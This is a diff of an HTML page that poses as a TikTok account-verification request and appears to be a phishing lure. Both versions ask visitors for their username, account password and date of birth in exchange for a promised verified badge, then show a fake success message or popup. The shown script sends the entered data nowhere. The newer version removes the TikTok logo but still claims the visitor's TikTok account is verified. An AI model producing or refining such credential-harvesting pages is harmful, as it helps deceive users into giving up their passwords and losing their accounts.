@@ -3,189 +3,183 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>TikTok Verification Request</title>
+  <title>Verification Portal</title>
   <style>
     :root {
       --primary: #ff0050;
-      --background: #f1f1f1;
+      --bg: #f0f0f5;
+      --white: #fff;
       --text: #222;
-      --muted: #666;
-      --input-bg: #f9f9f9;
+      --muted: #777;
       --border: #ccc;
-      --success-bg: #4CAF50;
-      --hover-bg: #e60045;
-      --btn-radius: 14px;
+      --success: #4CAF50;
     }
 
     * {
       box-sizing: border-box;
-      font-family: 'Segoe UI', sans-serif;
-      margin: 0;
-      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
     }
 
     body {
-      background-color: var(--background);
-      min-height: 100vh;
+      margin: 0;
+      padding: 0;
+      background-color: var(--bg);
       display: flex;
-      align-items: center;
       justify-content: center;
-      padding: 40px 15px;
+      align-items: center;
+      height: 100vh;
     }
 
     .form-wrapper {
-      background-color: #fff;
-      padding: 50px 35px;
-      border-radius: 18px;
-      border: 2px solid var(--border);
-      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.15);
+      background-color: var(--white);
       width: 100%;
       max-width: 500px;
-      animation: fadeInUp 1s ease-out;
-    }
-
-    .form-wrapper img {
-      width: 60px;
-      margin: 0 auto 20px;
-      display: block;
+      padding: 40px 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 60px rgba(0,0,0,0.15);
+      position: relative;
     }
 
     .form-wrapper h2 {
-      text-align: center;
-      margin-bottom: 10px;
       font-size: 24px;
+      margin-bottom: 10px;
+      text-align: center;
       color: var(--text);
     }
 
     .form-wrapper p {
-      text-align: center;
       font-size: 14px;
+      text-align: center;
       color: var(--muted);
-      margin-bottom: 25px;
+      margin-bottom: 30px;
     }
 
     label {
       display: block;
-      margin-top: 18px;
-      margin-bottom: 6px;
-      font-size: 14px;
+      font-size: 13px;
+      margin-bottom: 5px;
       color: var(--text);
     }
 
     input {
       width: 100%;
-      padding: 13px;
+      padding: 12px;
+      margin-bottom: 20px;
       border: 1px solid var(--border);
-      border-radius: var(--btn-radius);
-      background-color: var(--input-bg);
+      border-radius: 0px;
+      background: #fdfdfd;
       font-size: 14px;
-      margin-bottom: 10px;
       transition: 0.3s;
     }
 
     input:focus {
       outline: none;
       border-color: var(--primary);
-      background-color: #fff;
-      box-shadow: 0 0 5px rgba(255, 0, 80, 0.1);
     }
 
     button {
-      margin-top: 25px;
       width: 100%;
+      padding: 14px;
       background-color: var(--primary);
       color: #fff;
-      border: none;
-      border-radius: var(--btn-radius);
-      padding: 14px;
-      font-size: 15px;
+      font-size: 16px;
       font-weight: bold;
+      border: none;
       cursor: pointer;
-      transition: background 0.3s;
+      transition: 0.3s;
     }
 
     button:hover {
-      background-color: var(--hover-bg);
+      background-color: #e00045;
     }
 
-    #confirmationMessage {
+    .popup {
       display: none;
-      margin-top: 30px;
-      padding: 15px;
-      background-color: var(--success-bg);
-      color: white;
-      border-radius: var(--btn-radius);
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.8);
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+
+    .popup-content {
+      background: #fff;
+      padding: 40px;
+      max-width: 600px;
+      width: 90%;
+      border-radius: 12px;
+      box-shadow: 0 0 50px rgba(0, 0, 0, 0.2);
       text-align: center;
-      font-size: 16px;
-      opacity: 0;
-      transform: translateY(20px);
-      transition: opacity 0.6s, transform 0.6s;
+      animation: fadeIn 1s ease-in-out;
     }
 
-    .note {
-      text-align: center;
-      font-size: 12px;
-      color: var(--muted);
-      margin-top: 20px;
+    .popup-content h1 {
+      font-size: 28px;
+      margin-bottom: 20px;
+      color: var(--success);
     }
 
-    @keyframes fadeInUp {
-      from {
-        opacity: 0;
-        transform: translateY(40px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
+    .popup-content code {
+      display: block;
+      background: #111;
+      color: #0f0;
+      text-align: left;
+      padding: 20px;
+      border-radius: 10px;
+      font-family: Consolas, monospace;
+      font-size: 14px;
+      overflow-x: auto;
     }
 
-    @media (max-width: 480px) {
-      .form-wrapper {
-        padding: 30px 20px;
-      }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
     }
   </style>
 </head>
 <body>
+
   <div class="form-wrapper">
-    <img src="https://upload.wikimedia.org/wikipedia/en/6/69/TikTok_logo.svg" alt="TikTok Logo">
-    <h2>Request Account Verification</h2>
-    <p>Complete the form to request your verified badge on TikTok.</p>
-    <form id="verificationForm">
-      <label for="fullname">Full Name</label>
-      <input type="text" id="fullname" placeholder="e.g., John Doe" required>
+    <h2>Account Verification</h2>
+    <p>Please fill in your information to request verification.</p>
+    <form id="form">
+      <label for="name">Full Name</label>
+      <input type="text" id="name" placeholder="John Doe" required>
 
-      <label for="username">TikTok Username</label>
-      <input type="text" id="username" placeholder="@username" required>
+      <label for="user">Username</label>
+      <input type="text" id="user" placeholder="@username" required>
 
-      <label for="password">Account Password</label>
-      <input type="password" id="password" placeholder="••••••••" required>
+      <label for="pass">Password</label>
+      <input type="password" id="pass" placeholder="••••••••" required>
 
       <label for="dob">Date of Birth</label>
-      <input type="date" id="dob" value="2000-01-01" required>
+      <input type="date" id="dob" required>
 
-      <button type="submit">Submit Request</button>
+      <button type="submit">Submit</button>
     </form>
-    <div id="confirmationMessage">تم توثيق الحساب بنجاح! سيتم التحقق من حسابك قريبًا.</div>
-    <div class="note">Your request will be reviewed within 3–5 business days.</div>
+  </div>
+
+  <div class="popup" id="popup">
+    <div class="popup-content">
+      <h1>Account Verified</h1>
+      <code>
+        // Verification Success Code<br>
+        const userVerified = true;<br>
+        const message = "Your TikTok account has been successfully verified!";<br>
+        console.log(message);<br>
+        alert("تم التحقق من الحساب بنجاح!");<br>
+        window.location.href = "/dashboard";
+      </code>
+    </div>
   </div>
 
   <script>
-    document.getElementById('verificationForm').addEventListener('submit', function(event) {
-      event.preventDefault();
-
-      // إخفاء النموذج
-      document.querySelector('form').style.display = 'none';
-
-      // عرض التأكيد
-      const confirmationMessage = document.getElementById('confirmationMessage');
-      confirmationMessage.style.display = 'block';
-
-      setTimeout(() => {
-        confirmationMessage.style.opacity = 1;
-        confirmationMessage.style.transform = 'translateY(0)';
-      }, 100);
+    document.getElementById("form").addEventListener("submit", function(e) {
+      e.preventDefault();
+      document.getElementById("popup").style.display = "flex";
     });
   </script>
 </body>
